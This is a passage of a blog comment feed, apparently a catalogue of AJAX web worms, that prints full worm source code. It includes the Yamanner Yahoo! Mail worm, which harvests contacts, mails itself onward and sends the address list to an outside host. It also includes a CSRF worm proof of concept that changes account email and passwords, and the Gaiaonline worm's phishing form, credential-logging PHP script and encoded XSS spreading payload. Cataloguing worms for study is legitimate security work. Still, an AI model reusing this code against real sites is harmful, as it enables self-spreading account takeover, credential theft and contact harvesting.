+			AIndex = ComposeAction.indexOf(&#039;&amp;Mid&#039; ,0);
+
+			CutLen = AIndex - QIndex - 5;
+
+			var BoxName = ComposeAction.substr(QIndex + 5, CutLen); 
+
+			Param = &#039;SEND=1&amp;SD=&amp;SC=&amp;CAN=&amp;docCharset=windows-1256&amp;PhotoMailUser=&amp;PhotoToolInstall=&amp;OpenInsertPhoto=&amp;PhotoGetStart=0&amp;SaveCopy=no&amp;PhotoMailInstallOrigin=&amp;.crumb=RUMBVAL&amp;Mid=EMAILMID&amp;inc=&amp;AttFol=&amp;box=BOXNAME&amp;FwdFile=YM_FM&amp;FwdMsg=EMAILMID&amp;FwdSubj=EMAILSUBJ&amp;FwdInline=&amp;OriginalFrom=FROMEMAIL&amp;OriginalSubject=EMAILSUBJ&amp;InReplyTo=&amp;NumAtt=0&amp;AttData=&amp;UplData=&amp;OldAttData=&amp;OldUplData=&amp;FName=&amp;ATT=&amp;VID=&amp;Markers=&amp;NextMarker=0&amp;Thumbnails=&amp;PhotoMailWith=&amp;BrowseState=&amp;PhotoIcon=&amp;ToolbarState=&amp;VirusReport=&amp;Attachments=&amp;Background=&amp;BGRef=&amp;BGDesc=&amp;BGDef=&amp;BGFg=&amp;BGFF=&amp;BGFS=&amp;BGSolid=&amp;BGCustom=&amp;PlainMsg=%3Cbr%3E%3Cbr%3ENote%3A+forwarded+message+attached.&amp;PhotoFrame=&amp;PhotoPrintAtHomeLink=&amp;PhotoSlideShowLink=&amp;PhotoPrintLink=&amp;PhotoSaveLink=&amp;PhotoPermCap=&amp;PhotoPermPath=&amp;PhotoDownloadUrl=&amp;PhotoSaveUrl=&amp;PhotoFlags=&amp;start=compose&amp;bmdomain=&amp;showcc=&amp;showbcc=&amp;AC_Done=&amp;AC_ToList=0%2C&amp;AC_CcList=&amp;AC_BccList=&amp;sendtop=Send&amp;savedrafttop=Save+as+a+Draft&amp;canceltop=Cancel&amp;FromAddr=&amp;To=TOEMAIL&amp;Cc=&amp;Bcc=BCCLIST&amp;Subj=EMAILSUBJ&amp;Body=%3CBR%3E%3CBR%3ENote%3A+forwarded+message+attached.&amp;Format=html&amp;sendbottom=Send&amp;savedraftbottom=Save+as+a+Draft&amp;cancelbottom=Cancel&amp;cancelbottom=Cancel&#039;; 
+
+			Param = Param.replace(&#039;BOXNAME&#039;, BoxName); 
+
+			Param = Param.replace(&#039;RUMBVAL&#039;, CRumb); 
+
+			Param = Param.replace(&#039;BCCLIST&#039;, IDList); 
+
+			Param = Param.replace(&#039;TOEMAIL&#039;, Email);
+
+			Param = Param.replace(&#039;FROMEMAIL&#039;, &#039;av3@yahoo.com&#039;); 
+
+			Param = Param.replace(&#039;EMAILBODY&#039;, MyBody); 
+
+			Param = Param.replace(&#039;PlainMESSAGE&#039;, &#039;&#039;); 
+
+			Param = Param.replace(&#039;EMAILSUBJ&#039;, MySubj);
+
+			Param= Param.replace(&#039;EMAILSUBJ&#039;, MySubj);
+
+			Param = Param.replace(&#039;EMAILSUBJ&#039;, MySubj); 
+
+			Param = Param.replace(&#039;EMAILMID&#039;, MyMid);
+
+			Param = Param.replace(&#039;EMAILMID&#039;, MyMid);
+
+			makeRequest(Url , alertContents, &#039;POST&#039;, Param); 
+
+		} 
+
+	}
+
+}
+
+
+
+function alertContents() { 
+
+	if (http_request.readyState == 4) { 
+
+		window.navigate(&#039;http://www.av3.net/?ShowFolder&amp;rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;BCCList=&#039; + IDList) 
+
+	}
+
+}
+
+
+
+makeRequest(&#039;http://us.&#039; + Server + &#039;.mail.yahoo.com/ym/QuickBuilder?build=Continue&amp;cancel=&amp;continuetop=Continue&amp;canceltop=Cancel&amp;Inbox=Inbox&amp;Sent=Sent&amp;pfolder=all&amp;freqCheck=&amp;freq=1&amp;numdays=on&amp;date=180&amp;ps=1&amp;numadr=100&amp;continuebottom=Continue&amp;cancelbottom=Cancel&amp;rnd=&#039; + Math.random(), ListContacts, &#039;GET&#039;, null)&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Yahoo!, mail&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>Yamanner</h3>
+<p>Yamanner was a worm that exploited a vulnerability in the Yahoo! Mail service to send a copy of itself to other Yahoo! Mail contacts and it also captured the addresses in the addressbook of all the infected users and uploaded them to a server. By doing so, it was building an email list with many thousands of names that could be sold to spammers.</p>
+<pre><code>var http_request = false; 
+
+var Email = ''; 
+
+var IDList = ''; 
+
+var CRumb = ''; 
+
+function makeRequest(url, Func, Method, Param) {
+
+	if (window.XMLHttpRequest) 
+
+	{ 
+
+		http_request = new XMLHttpRequest();
+
+	} else if (window.ActiveXObject) 
+
+	{ 
+
+		http_request = new ActiveXObject('Microsoft.XMLHTTP'); 
+
+	}
+
+	http_request. onfiltered= Func;
+
+	http_request.open(Method, url, true);
+
+	if( Method == 'GET') http_request.send(null);
+
+	else http_request.send(Param);
+
+}
+
+window.open('http://www.lastdata.com'); 
+
+ServerUrl = url0;USIndex = ServerUrl.indexOf('us.' ,0);
+
+MailIndex = ServerUrl.indexOf('.mail' ,0);
+
+CutLen = MailIndex - USIndex - 3;
+
+var Server = ServerUrl.substr(USIndex + 3, CutLen); 
+
+function GetIDs(HtmlContent) { 
+
+	IDList = '';
+
+	StartString = ' ';
+
+	EndString = '';
+
+	i = 0; 
+
+	StartIndex = HtmlContent.indexOf(StartString, 0); 
+
+	while(StartIndex &gt;= 0) { 
+
+		EndIndex = HtmlContent.indexOf(EndString, StartIndex); 
+
+		CutLen = EndIndex - StartIndex - StartString.length; 
+
+		YahooID = HtmlContent.substr(StartIndex + StartString.length, CutLen); 
+
+		if( YahooID.indexOf('@yahoo.com', 0) &gt; 0 || YahooID.indexOf('@yahoogroups.com', 0) &gt; 0 ) IDList = IDList + ',' + YahooID ; 
+
+		StartString = ''; 
+
+		StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); 
+
+		StartString = ' '; 
+
+		StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); 
+
+		i++; 
+
+	} 
+
+	if(IDList.substr(0,1) == ',') IDList = IDList.substr(1, IDList.length); 
+
+	if(IDList.indexOf(',', 0)&gt;0 ) { 
+
+		IDListArray = IDList.split(','); 
+
+		Email = IDListArray[0]; 
+
+		IDList = IDList.replace(Email + ',', ''); 
+
+	} 
+
+	CurEmail = spamform.NE.value; 
+
+	IDList = IDList.replace(CurEmail + ',', ''); 
+
+	IDList = IDList.replace(',' + CurEmail, '');
+
+	IDList = IDList.replace(CurEmail, '');
+
+	UserEmail = showLetter.FromAddress.value;
+
+	IDList = IDList.replace(',' + UserEmail, '');
+
+	IDList = IDList.replace(UserEmail + ',', '');
+
+	IDList = IDList.replace(UserEmail, ''); 
+
+	return IDList; 
+
+}
+
+function ListContacts() {
+
+	if (http_request.readyState == 4) {
+
+		if (http_request.status == 200) { 
+
+			HtmlContent = http_request.responseText;
+
+			IDList = GetIDs(HtmlContent); 
+
+			makeRequest('http://us.' + Server + '.mail.yahoo.com/ym/Compose/?rnd=' + Math.random(), Getcrumb, 'GET', null); 
+
+		} 
+
+	}
+
+}
+
+function ExtractStr(HtmlContent) { 
+
+	StartString = 'name=\u0022.crumb\u0022 value=\u0022'; 
+
+	EndString = '\u0022'; 
+
+	i = 0; 
+
+	StartIndex = HtmlContent.indexOf(StartString, 0); 
+
+	EndIndex = HtmlContent.indexOf(EndString, StartIndex + StartString.length ); 
+
+	CutLen = EndIndex - StartIndex - StartString.length; 
+
+	crumb = HtmlContent.substr(StartIndex + StartString.length , CutLen ); 
+
+	return crumb; 
+
+}
+
+function Getcrumb() { 
+
+	if (http_request.readyState == 4) { 
+
+		if (http_request.status == 200) { 
+
+			HtmlContent = http_request.responseText; 
+
+			CRumb = ExtractStr(HtmlContent); 
+
+			MyBody = 'this is test'; 
+
+			MySubj = 'New Graphic Site'; 
+
+			Url = 'http://us.' + Server + '.mail.yahoo.com/ym/Compose'; 
+
+			var ComposeAction = compose.action;MidIndex = ComposeAction.indexOf('&amp;Mid=' ,0);
+
+			incIndex = ComposeAction.indexOf('&amp;inc' ,0);
+
+			CutLen = incIndex - MidIndex - 5;
+
+			var MyMid = ComposeAction.substr(MidIndex + 5, CutLen); 
+
+			QIndex = ComposeAction.indexOf('?box=' ,0);
+
+			AIndex = ComposeAction.indexOf('&amp;Mid' ,0);
+
+			CutLen = AIndex - QIndex - 5;
+
+			var BoxName = ComposeAction.substr(QIndex + 5, CutLen); 
+
+			Param = 'SEND=1&amp;SD=&amp;SC=&amp;CAN=&amp;docCharset=windows-1256&amp;PhotoMailUser=&amp;PhotoToolInstall=&amp;OpenInsertPhoto=&amp;PhotoGetStart=0&amp;SaveCopy=no&amp;PhotoMailInstallOrigin=&amp;.crumb=RUMBVAL&amp;Mid=EMAILMID&amp;inc=&amp;AttFol=&amp;box=BOXNAME&amp;FwdFile=YM_FM&amp;FwdMsg=EMAILMID&amp;FwdSubj=EMAILSUBJ&amp;FwdInline=&amp;OriginalFrom=FROMEMAIL&amp;OriginalSubject=EMAILSUBJ&amp;InReplyTo=&amp;NumAtt=0&amp;AttData=&amp;UplData=&amp;OldAttData=&amp;OldUplData=&amp;FName=&amp;ATT=&amp;VID=&amp;Markers=&amp;NextMarker=0&amp;Thumbnails=&amp;PhotoMailWith=&amp;BrowseState=&amp;PhotoIcon=&amp;ToolbarState=&amp;VirusReport=&amp;Attachments=&amp;Background=&amp;BGRef=&amp;BGDesc=&amp;BGDef=&amp;BGFg=&amp;BGFF=&amp;BGFS=&amp;BGSolid=&amp;BGCustom=&amp;PlainMsg=%3Cbr%3E%3Cbr%3ENote%3A+forwarded+message+attached.&amp;PhotoFrame=&amp;PhotoPrintAtHomeLink=&amp;PhotoSlideShowLink=&amp;PhotoPrintLink=&amp;PhotoSaveLink=&amp;PhotoPermCap=&amp;PhotoPermPath=&amp;PhotoDownloadUrl=&amp;PhotoSaveUrl=&amp;PhotoFlags=&amp;start=compose&amp;bmdomain=&amp;showcc=&amp;showbcc=&amp;AC_Done=&amp;AC_ToList=0%2C&amp;AC_CcList=&amp;AC_BccList=&amp;sendtop=Send&amp;savedrafttop=Save+as+a+Draft&amp;canceltop=Cancel&amp;FromAddr=&amp;To=TOEMAIL&amp;Cc=&amp;Bcc=BCCLIST&amp;Subj=EMAILSUBJ&amp;Body=%3CBR%3E%3CBR%3ENote%3A+forwarded+message+attached.&amp;Format=html&amp;sendbottom=Send&amp;savedraftbottom=Save+as+a+Draft&amp;cancelbottom=Cancel&amp;cancelbottom=Cancel'; 
+
+			Param = Param.replace('BOXNAME', BoxName); 
+
+			Param = Param.replace('RUMBVAL', CRumb); 
+
+			Param = Param.replace('BCCLIST', IDList); 
+
+			Param = Param.replace('TOEMAIL', Email);
+
+			Param = Param.replace('FROMEMAIL', 'av3@yahoo.com'); 
+
+			Param = Param.replace('EMAILBODY', MyBody); 
+
+			Param = Param.replace('PlainMESSAGE', ''); 
+
+			Param = Param.replace('EMAILSUBJ', MySubj);
+
+			Param= Param.replace('EMAILSUBJ', MySubj);
+
+			Param = Param.replace('EMAILSUBJ', MySubj); 
+
+			Param = Param.replace('EMAILMID', MyMid);
+
+			Param = Param.replace('EMAILMID', MyMid);
+
+			makeRequest(Url , alertContents, 'POST', Param); 
+
+		} 
+
+	}
+
+}
+
+function alertContents() { 
+
+	if (http_request.readyState == 4) { 
+
+		window.navigate('http://www.av3.net/?ShowFolder&amp;rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;ShowFolder?rb=Sent&amp;reset=1&amp;YY=75867&amp;inc=25&amp;order=down&amp;sort=date&amp;pos=0&amp;view=a&amp;head=f&amp;box=Inbox&amp;BCCList=' + IDList) 
+
+	}
+
+}
+
+makeRequest('http://us.' + Server + '.mail.yahoo.com/ym/QuickBuilder?build=Continue&amp;cancel=&amp;continuetop=Continue&amp;canceltop=Cancel&amp;Inbox=Inbox&amp;Sent=Sent&amp;pfolder=all&amp;freqCheck=&amp;freq=1&amp;numdays=on&amp;date=180&amp;ps=1&amp;numadr=100&amp;continuebottom=Continue&amp;cancelbottom=Cancel&amp;rnd=' + Math.random(), ListContacts, 'GET', null)</code></pre>
+<p>Yahoo!, mail</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: .mario</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-2698</link>
+		<dc:creator>.mario</dc:creator>
+		<pubDate>Tue, 23 Jan 2007 21:18:25 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-2698</guid>
+		<description>&lt;h3&gt;empornium.us - AJAX Worm PoC&lt;/h3&gt;
+
+&lt;p&gt;This stub of a worm can be put into empornium.us torrent descriptions. Could be extended with more malicious payload and spread over the user&#039;s infected torrent descriptions. The worm has never run in the wild - admins of the portal were informed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$(document).ready(function(){ 
+	$.ajax({
+  		type: 	&quot;POST&quot;,
+  		url: 	&quot;http://empornium.us/takeprofedit.php&quot;,
+  		data: 	&quot;acceptpms=no&amp;pmnotif=no&amp;avatar=http://img150.imageshack.us/img150/3060/stallowned5wk.jpg&amp;info=&amp;email=stall@owned.org&amp;chpassword=123456&amp;passagain=123456&quot;,
+ 	 	success: function(msg){
+   			alert( &quot;Loading Complete...&quot; );
+  		}
+	});
+ });&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;empornium, csrf, ajax&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>empornium.us &#8211; AJAX Worm PoC</h3>
+<p>This stub of a worm can be put into empornium.us torrent descriptions. Could be extended with more malicious payload and spread over the user&#8217;s infected torrent descriptions. The worm has never run in the wild &#8211; admins of the portal were informed.</p>
+<pre><code>$(document).ready(function(){
+	$.ajax({
+  		type: 	"POST",
+  		url: 	"http://empornium.us/takeprofedit.php",
+  		data: 	"acceptpms=no&amp;pmnotif=no&amp;avatar=http://img150.imageshack.us/img150/3060/stallowned5wk.jpg&amp;info=&amp;email=stall@owned.org&amp;chpassword=123456&amp;passagain=123456",
+ 	 	success: function(msg){
+   			alert( "Loading Complete..." );
+  		}
+	});
+ });</code></pre>
+<p>empornium, csrf, ajax</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1874</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Thu, 04 Jan 2007 19:21:59 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1874</guid>
+		<description>&lt;h3&gt;Gaiaonline Worm&lt;/h3&gt;
+
+&lt;p&gt;On 4th Jan 2007 Gaiaonline.com is hit by a worm.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;log.php&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&lt;head&gt;
+&lt;title&gt;Error!&lt;/title&gt;
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.gaiaonline.com&quot;&gt;
+&lt;/head&gt;
+&lt;?php 
+// Declares file to log to.
+$myFile = &quot;log.txt&quot;;
+// Set file handler. or end execution if file doesnt exist.
+$fh = fopen($myFile, &#039;a&#039;) or die(&quot;can&#039;t open file&quot;);
+//Take data sent via POST from start.js and put it in $stringData
+$stringData = $_POST[&quot;username&quot;];
+// Write string to file.
+fwrite($fh, $stringData);
+// Add a tilde followed by newline to divide each entry.
+$stringData = &quot;~\n&quot;;
+fwrite($fh, $stringData);
+fclose($fh);
+
+?&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;start.js&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// Content to replace div &quot;content&quot; with. 
+var newContent = &#039;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;	&lt;tr&gt;	&lt;td&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/s.gif&quot; width=&quot;1&quot; height=&quot;15&quot;&gt;&lt;/td&gt;	&lt;/tr&gt;	&lt;tr&gt;		&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/header/header_sign_in_large.gif&quot; width=&quot;203&quot; height=&quot;30&quot;&gt;&lt;/td&gt;	&lt;/tr&gt;	&lt;tr&gt;		&lt;td&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/s.gif&quot; width=&quot;1&quot; height=&quot;15&quot;&gt;&lt;/td&gt;	&lt;/tr&gt;&lt;/table&gt;&lt;table width=&quot;721&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/table/border_top_stationary.gif&quot; width=&quot;721&quot; height=&quot;1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=&quot;721&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; background=&quot;http://graphics4.gaiaonline.com/images/template/bg/stationary.gif&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;table width=&quot;710&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;4&quot;&gt;&lt;form action=&quot;http://gaiaonli.site.com/log.php&quot; method=&quot;post&quot; target=&quot;_top&quot; name=&quot;loginForm&quot;&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;span class=&quot;normbold&quot;&gt;Username:&#160;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;25&quot; maxlength=&quot;40&quot; class=&quot;vendform&quot; value=&quot;Anonymous&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;span class=&quot;normbold&quot;&gt;Password:&#160;&lt;/span&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; size=&quot;25&quot; maxlength=&quot;25&quot; class=&quot;vendform&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;span class=&quot;normbold&quot;&gt;Log me on automatically each visit:&lt;/span&gt;&lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;sid&quot; value=&quot;57181309749d15ca59db5332a46e673f&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;redirect&quot; value=&quot;&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; class=&quot;mainoption&quot; value=&quot;Login&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;span class=&quot;normbold&quot;&gt;&lt;a href=&quot;/account/index.php?mode=sendpass&quot; class=&quot;gensmall&quot;&gt;I forgot my password&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;span class=&quot;normbold&quot;&gt;Account activation problems? Click &lt;A HREF=&quot;http://www.gaiaonline.com/info/feedback.php&quot;&gt;here&lt;/A&gt;.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=&quot;721&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/table/border_bottom_stationary.gif&quot; width=&quot;721&quot; height=&quot;1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=&quot;http://graphics4.gaiaonline.com/images/template/s.gif&quot; width=&quot;1&quot; height=&quot;15&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#039;;
+//XSS vector
+var spreadOne = &quot;http://www.gaiaonline.com/community/search.php?val=&quot;
+
+//Replace content with newContent
+document.getElementById(&quot;content&quot;).innerHTML=newContent;
+
+
+//Detect which method of XHR to use.
+      var xmlhttp;
+      try {
+          // Mozilla / Safari / IE7
+          xmlhttp = new XMLHttpRequest();
+      } catch (e) {
+           // IE
+           var XMLHTTP_IDS = new Array(&#039;MSXML2.XMLHTTP.5.0&#039;,
+                                     &#039;MSXML2.XMLHTTP.4.0&#039;,
+                                     &#039;MSXML2.XMLHTTP.3.0&#039;,
+                                     &#039;MSXML2.XMLHTTP&#039;,
+                                     &#039;Microsoft.XMLHTTP&#039; );
+          var success = false;
+          for (var i=0;i &lt; XMLHTTP_IDS.length &amp;&amp; !success; i++) {
+              try {
+                   xmlhttp = new ActiveXObject(XMLHTTP_IDS[i]);
+                      success = true;
+                } catch (e) {}
+          }
+          if (!success) {
+              throw new Error(&#039;Unable to create XMLHttpRequest.&#039;);
+          }
+     }
+
+// URI to POST data to.
+var targetURI = &quot;/profile/privmsg.php&quot;;
+//Parameters to pass to targetURI
+var params = &quot;mode=post&amp;username=friends@gaia&amp;subject=Check this out&amp;folder=inbox&amp;post=true&amp;message=You should go check [url=&quot; + spreadOne + escape(&#039;%22%3E%3Csc%72%69%70t%20defer%20%73%72%63%3D%2F/viewfor%2E%73%69%74%65%2E%63%6F%6D%2F%61%73%74%61%72%74%2E%6A%73%3E%3C/sc%72%69%70t%3E%3C%73%74%79%6C%65%3E&#039;) + &quot;]this[/url] out.&quot;;
+
+//Start XHR
+xmlhttp.open(&quot;POST&quot;, targetURI, true);
+
+//Set proper headers.
+xmlhttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.setRequestHeader(&quot;Content-length&quot;, params.length);
+xmlhttp.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+
+// Send the parameters to the target. In this case, the &quot;Check this out&quot; PM.
+xmlhttp.send(params);&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Gaiaonline&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>Gaiaonline Worm</h3>
+<p>On 4th Jan 2007 Gaiaonline.com is hit by a worm.</p>
+<p><em>log.php</em></p>
+<pre><code>&lt;head&gt;
+&lt;title&gt;Error!&lt;/title&gt;
+&lt;meta http-equiv="refresh" content="0;url=http://www.gaiaonline.com"&gt;
+&lt;/head&gt;
+&lt;?php
+// Declares file to log to.
+$myFile = "log.txt";
+// Set file handler. or end execution if file doesnt exist.
+$fh = fopen($myFile, 'a') or die("can't open file");
+//Take data sent via POST from start.js and put it in $stringData
+$stringData = $_POST["username"];
+// Write string to file.
+fwrite($fh, $stringData);
+// Add a tilde followed by newline to divide each entry.
+$stringData = "~\n";
+fwrite($fh, $stringData);
+fclose($fh);
+
+?&gt;</code></pre>
+<p><em>start.js</em></p>
+<pre><code>// Content to replace div "content" with.
+var newContent = '&lt;table width="100%" border="0" cellspacing="0" cellpadding="0" align="center"&gt;	&lt;tr&gt;	&lt;td&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/s.gif" width="1" height="15"&gt;&lt;/td&gt;	&lt;/tr&gt;	&lt;tr&gt;		&lt;td align="center"&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/header/header_sign_in_large.gif" width="203" height="30"&gt;&lt;/td&gt;	&lt;/tr&gt;	&lt;tr&gt;		&lt;td&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/s.gif" width="1" height="15"&gt;&lt;/td&gt;	&lt;/tr&gt;&lt;/table&gt;&lt;table width="721" border="0" cellspacing="0" cellpadding="0" align="center"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/table/border_top_stationary.gif" width="721" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="721" border="0" cellspacing="0" cellpadding="5" background="http://graphics4.gaiaonline.com/images/template/bg/stationary.gif" align="center"&gt;&lt;tr&gt;&lt;td&gt;&lt;table width="710" border="0" cellspacing="0" cellpadding="4"&gt;&lt;form action="http://gaiaonli.site.com/log.php" method="post" target="_top" name="loginForm"&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;span class="normbold"&gt;Username:&nbsp;&lt;/span&gt;&lt;input type="text" name="username" size="25" maxlength="40" class="vendform" value="Anonymous" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;span class="normbold"&gt;Password:&nbsp;&lt;/span&gt;&lt;input type="password" name="password" size="25" maxlength="25" class="vendform" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;span class="normbold"&gt;Log me on automatically each visit:&lt;/span&gt;&lt;input type="checkbox" name="autologin"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;input type="hidden" name="sid" value="57181309749d15ca59db5332a46e673f" /&gt;&lt;input type="hidden" name="redirect" value="" /&gt;&lt;input type="submit" name="login" class="mainoption" value="Login" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;span class="normbold"&gt;&lt;a href="/account/index.php?mode=sendpass" class="gensmall"&gt;I forgot my password&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="center"&gt;&lt;span class="normbold"&gt;Account activation problems? Click &lt;A HREF="http://www.gaiaonline.com/info/feedback.php"&gt;here&lt;/A&gt;.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="721" border="0" cellspacing="0" cellpadding="0" align="center"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/table/border_bottom_stationary.gif" width="721" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="100%" border="0" cellspacing="0" cellpadding="0" align="center"&gt;&lt;tr&gt;&lt;td&gt;&lt;img src="http://graphics4.gaiaonline.com/images/template/s.gif" width="1" height="15"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
+//XSS vector
+var spreadOne = "http://www.gaiaonline.com/community/search.php?val="
+
+//Replace content with newContent
+document.getElementById("content").innerHTML=newContent;
+
+//Detect which method of XHR to use.
+      var xmlhttp;
+      try {
+          // Mozilla / Safari / IE7
+          xmlhttp = new XMLHttpRequest();
+      } catch (e) {
+           // IE
+           var XMLHTTP_IDS = new Array('MSXML2.XMLHTTP.5.0',
+                                     'MSXML2.XMLHTTP.4.0',
+                                     'MSXML2.XMLHTTP.3.0',
+                                     'MSXML2.XMLHTTP',
+                                     'Microsoft.XMLHTTP' );
+          var success = false;
+          for (var i=0;i &lt; XMLHTTP_IDS.length &#038;&#038; !success; i++) {
+              try {
+                   xmlhttp = new ActiveXObject(XMLHTTP_IDS[i]);
+                      success = true;
+                } catch (e) {}
+          }
+          if (!success) {
+              throw new Error('Unable to create XMLHttpRequest.');
+          }
+     }
+
+// URI to POST data to.
+var targetURI = "/profile/privmsg.php";
+//Parameters to pass to targetURI
+var params = "mode=post&#038;username=friends@gaia&#038;subject=Check this out&#038;folder=inbox&#038;post=true&#038;message=You should go check [url=" + spreadOne + escape('%22%3E%3Csc%72%69%70t%20defer%20%73%72%63%3D%2F/viewfor%2E%73%69%74%65%2E%63%6F%6D%2F%61%73%74%61%72%74%2E%6A%73%3E%3C/sc%72%69%70t%3E%3C%73%74%79%6C%65%3E') + "]this[/url] out.";
+
+//Start XHR
+xmlhttp.open("POST", targetURI, true);
+
+//Set proper headers.
+xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xmlhttp.setRequestHeader("Content-length", params.length);
+xmlhttp.setRequestHeader("Connection", "close");
+
+// Send the parameters to the target. In this case, the "Check this out" PM.
+xmlhttp.send(params);</code></pre>
+<p>Gaiaonline</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1124</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Sun, 10 Dec 2006 00:50:07 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1124</guid>
+		<description>&lt;h3&gt;The ORKUT Worm&lt;/h3&gt;
+
